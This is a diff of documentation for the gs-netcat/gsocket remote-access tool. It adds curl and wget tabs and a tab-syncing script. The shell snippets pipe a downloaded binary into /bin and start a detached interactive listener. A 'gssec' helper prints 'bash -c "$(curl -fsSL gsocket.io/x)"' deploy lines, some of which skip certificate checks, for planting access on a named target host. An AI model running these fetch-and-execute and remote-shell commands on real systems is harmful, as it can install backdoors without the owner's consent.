@@ -294,12 +294,41 @@ If all fails:
 
 Download the static binary from [https://github.com/hackerschoice/binary/tree/main/gsocket/bin](https://github.com/hackerschoice/binary/tree/main/gsocket/bin) (likely [gs-netcat_x86_64-alpine.tar.gz](https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz)) and extract and start gs-netcat manually:
 
-```shell
+<div class="tabs-wrapper">
+    <div class="tabs" style="height: 25.45rem;">
+        <div class="tab">
+            <input type="radio" name="css-tabs-manual" id="curl-manual" class="tab-switch" checked>
+            <label for="curl-manual" class="tab-label">Curl</label>
+            <div class="tab-content">
+{% highlight shell %}
 curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
 SECRET=$(/bin/gs-netcat -g)
 GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
 echo "Connect with: gs-netcat -s $SECRET -i" 
-```
+{% endhighlight %}
+            </div>
+        </div>
+        <div class="tab">
+            <input type="radio" name="css-tabs-manual" id="wget-manual" class="tab-switch">
+            <label for="wget-manual" class="tab-label">Wget</label>
+            <div class="tab-content">
+{% highlight shell %}
+wget --no-check-certificate -qO- https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
+SECRET=$(/bin/gs-netcat -g)
+GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
+echo "Connect with: gs-netcat -s $SECRET -i" 
+{% endhighlight %}
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ```shell
+curl -fsSL https://github.com/hackerschoice/binary/raw/main/gsocket/bin/gs-netcat_x86_64-alpine.tar.gz | tar xz -C /bin gs-netcat
+SECRET=$(/bin/gs-netcat -g)
+GSOCKET_ARGS="-liD -s $SECRET" /bin/gs-netcat
+echo "Connect with: gs-netcat -s $SECRET -i" 
+``` -->
 
 {:refdef: style="text-align: center;"}
 ## Advanced Tips & Tricks
@@ -307,7 +336,78 @@ echo "Connect with: gs-netcat -s $SECRET -i"
 
 Remembering many secrets from many deployments is cumbersome. It is easier to remember just one MASTER-SEED and derive the SECRET from the target's hostname. The following script generates a secure SECRET based on a single MASTER-SEED and the target's hostname.
 
-```sh
+<div class="tabs-wrapper">
+    <div class="tabs" style="height: 25.45rem;">
+        <div class="tab">
+            <input type="radio" name="css-tabs-advanced" id="curl-advanced" class="tab-switch" checked>
+            <label for="curl-advanced" class="tab-label">Curl</label>
+            <div class="tab-content" style="height: 23.5rem;">
+<p>
+{% highlight sh %}
+# cut & paste this into your shell on your workstation or add to ~/.bashrc
+gssec()
+{
+    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
+    str="${str:0:22}"
+    echo "DEPLOY: X=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
+    echo "ACCESS: S=${str}"' bash -c "$(curl -fsSL gsocket.io/x)"'
+    echo "ACCESS: gs-netcat -s ${str} -i"
+}
+
+# Pick a STRONG master seed:
+[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
+{% endhighlight %}
+</p>
+<p>
+{% highlight sh %}
+# Generate a SECRET based on the SEED and 'alice.com'
+$ gssec alice.com # You only need to know "alice.com" to connect.
+
+# Output from above's command:
+DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
+ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
+ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
+{% endhighlight %}
+</p>
+            </div>
+        </div>
+        <div class="tab">
+            <input type="radio" name="css-tabs-advanced" id="wget-advanced" class="tab-switch">
+            <label for="wget-advanced" class="tab-label">Wget</label>
+            <div class="tab-content" style="height: 23.5rem;">
+<p>
+{% highlight sh %}
+# cut & paste this into your shell on your workstation or add to ~/.bashrc
+gssec()
+{
+    str="$(echo "${GS_SEED:?}$1" | sha512sum | base64 | tr -d -c a-z0-9)"
+    str="${str:0:22}"
+    echo "DEPLOY: X=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
+    echo "ACCESS: S=${str}"' bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"'
+    echo "ACCESS: gs-netcat -s ${str} -i"
+}
+
+# Pick a STRONG master seed:
+[[ -z $GS_SEED ]] && GS_SEED=MySuperStrongMasterSeed
+{% endhighlight %}
+</p>
+<p>
+{% highlight sh %}
+# Generate a SECRET based on the SEED and 'alice.com'
+$ gssec alice.com # You only need to know "alice.com" to connect.
+
+# Output from above's command:
+DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(wget --no-check-certificate -qO- gsocket.io/x)"
+ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
+{% endhighlight %}
+</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ```sh
 # cut & paste this into your shell on your workstation or add to ~/.bashrc
 gssec()
 {
@@ -329,6 +429,35 @@ $ gssec alice.com # You only need to know "alice.com" to connect.
 DEPLOY: X=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
 ACCESS: S=2m1zidi1zkkmxjjj0z0jlj bash -c "$(curl -fsSL gsocket.io/x)"
 ACCESS: gs-netcat -s 2m1zidi1zkkmxjjj0z0jlj -i
-```
+``` -->
 
 <p class="panel-note" markdown="1">Get Involved. We are looking for volunteers to work on the website and a logo and to discuss new ideas. [Join us on telegram](https://t.me/thcorg).</p>
+
+<!-- Adding some 'magic' over tabs ;) -->
+<script>
+    (() => {
+        const tabsSelector = 'input.tab-switch';
+        const tabsDebug = false;
+        document.querySelectorAll(tabsSelector).forEach((el) => {
+            const id = el.id;
+            const type = id.split('-')[0];
+            if (tabsDebug === true) {
+                console.log('[change] event listener attached on', id, '- type:', type);
+            }
+            el.addEventListener('change', (event) => {
+                if (tabsDebug === true) {
+                    console.log('Change event triggered.', event);
+                }
+                let targetTabs = String(event.target.id).includes(type) ? type : 'undefined';
+                if (tabsDebug === true) {
+                    console.log(`Should select other [${targetTabs}] tabs.`);
+                }
+                document.querySelectorAll(tabsSelector).forEach((target) => {
+                    if (String(target.id).includes(targetTabs) && !target.checked) {
+                        target.checked = true;
+                    }
+                });
+            });
+        });
+    })();
+</script>
